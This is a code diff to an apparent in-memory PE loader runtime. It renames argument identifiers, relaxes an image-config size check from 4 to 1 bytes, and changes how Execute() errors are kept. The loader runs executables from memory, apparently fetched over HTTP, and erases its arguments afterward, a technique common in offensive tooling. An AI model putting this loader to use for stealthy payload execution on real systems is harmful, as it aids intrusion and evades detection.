@@ -85,11 +85,7 @@ PELoader_M* Boot()
     }
 
     // execute PE image
-    errno ele = loader->Execute();
-    if (ele != NO_ERROR && err == NO_ERROR)
-    {
-        err = ele;
-    }
+    err = loader->Execute();
     if (!config.WaitMain)
     {
         SetLastErrno(err);
@@ -130,9 +126,9 @@ static errno loadOption(Runtime_Opts* options)
 __declspec(noinline)
 static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
 {
-    uint32 size;
     // load PE Image, it cannot be empty
-    if (!runtime->Argument.GetPointer(ARG_IDX_PE_IMAGE, &config->Image, &size))
+    uint32 size;
+    if (!runtime->Argument.GetPointer(ARG_ID_PE_IMAGE, &config->Image, &size))
     {
         return ERR_NOT_FOUND_PE_IMAGE;
     }
@@ -147,17 +143,17 @@ static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
     }
     config->Image = image;
     // load command line ANSI, it can be empty
-    if (!runtime->Argument.GetPointer(ARG_IDX_CMDLINE_A, &config->CommandLineA, NULL))
+    if (!runtime->Argument.GetPointer(ARG_ID_CMDLINE_A, &config->CommandLineA, NULL))
     {
         return ERR_NOT_FOUND_CMDLINE_A;
     }
     // load command line Unicode, it can be empty
-    if (!runtime->Argument.GetPointer(ARG_IDX_CMDLINE_W, &config->CommandLineW, NULL))
+    if (!runtime->Argument.GetPointer(ARG_ID_CMDLINE_W, &config->CommandLineW, NULL))
     {
         return ERR_NOT_FOUND_CMDLINE_W;
     }
     // load WaitMain, it must be true of false
-    if (!runtime->Argument.GetValue(ARG_IDX_WAIT_MAIN, &config->WaitMain, &size))
+    if (!runtime->Argument.GetValue(ARG_ID_WAIT_MAIN, &config->WaitMain, &size))
     {
         return ERR_NOT_FOUND_WAIT_MAIN;
     }
@@ -166,7 +162,7 @@ static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
         return ERR_INVALID_WAIT_MAIN;
     }
     // load AllowSkipDLL, it must be true of false
-    if (!runtime->Argument.GetValue(ARG_IDX_ALLOW_SKIP_DLL, &config->AllowSkipDLL, &size))
+    if (!runtime->Argument.GetValue(ARG_ID_ALLOW_SKIP_DLL, &config->AllowSkipDLL, &size))
     {
         return ERR_NOT_FOUND_ALLOW_SKIP_DLL;
     }
@@ -175,7 +171,7 @@ static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
         return ERR_INVALID_ALLOW_SKIP_DLL;
     }
     // load STD_INPUT_HANDLE, it can be zero
-    if (!runtime->Argument.GetValue(ARG_IDX_STD_INPUT, &config->StdInput, &size))
+    if (!runtime->Argument.GetValue(ARG_ID_STD_INPUT, &config->StdInput, &size))
     {
         return ERR_NOT_FOUND_STD_INPUT;
     }
@@ -184,7 +180,7 @@ static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
         return ERR_INVALID_STD_INPUT;
     }
     // load STD_OUTPUT_HANDLE, it can be zero
-    if (!runtime->Argument.GetValue(ARG_IDX_STD_OUTPUT, &config->StdOutput, &size))
+    if (!runtime->Argument.GetValue(ARG_ID_STD_OUTPUT, &config->StdOutput, &size))
     {
         return ERR_NOT_FOUND_STD_OUTPUT;
     }
@@ -193,7 +189,7 @@ static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
         return ERR_INVALID_STD_OUTPUT;
     }
     // load STD_ERROR_HANDLE, it can be zero
-    if (!runtime->Argument.GetValue(ARG_IDX_STD_ERROR, &config->StdError, &size))
+    if (!runtime->Argument.GetValue(ARG_ID_STD_ERROR, &config->StdError, &size))
     {
         return ERR_NOT_FOUND_STD_ERROR;
     }
@@ -206,7 +202,7 @@ static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
 
 static void* loadImage(Runtime_M* runtime, byte* config, uint32 size)
 {
-    if (size < 4)
+    if (size < 1)
     {
         SetLastErrno(ERR_INVALID_IMAGE_CONFIG);
         return NULL;
@@ -299,19 +295,19 @@ static void* loadImageFromHTTP(Runtime_M* runtime, byte* config)
 
 static errno eraseArguments(Runtime_M* runtime)
 {
-    uint32 idx[] = 
+    uint32 id[] = 
     {
-        ARG_IDX_PE_IMAGE,
-        ARG_IDX_WAIT_MAIN,
-        ARG_IDX_ALLOW_SKIP_DLL,
-        ARG_IDX_STD_INPUT,
-        ARG_IDX_STD_OUTPUT,
-        ARG_IDX_STD_ERROR,
+        ARG_ID_PE_IMAGE,
+        ARG_ID_WAIT_MAIN,
+        ARG_ID_ALLOW_SKIP_DLL,
+        ARG_ID_STD_INPUT,
+        ARG_ID_STD_OUTPUT,
+        ARG_ID_STD_ERROR,
     };
     bool success = true;
-    for (int i = 0; i < arrlen(idx); i++)
+    for (int i = 0; i < arrlen(id); i++)
     {
-        if (!runtime->Argument.Erase(idx[i]))
+        if (!runtime->Argument.Erase(id[i]))
         {
             success = false;   
         }
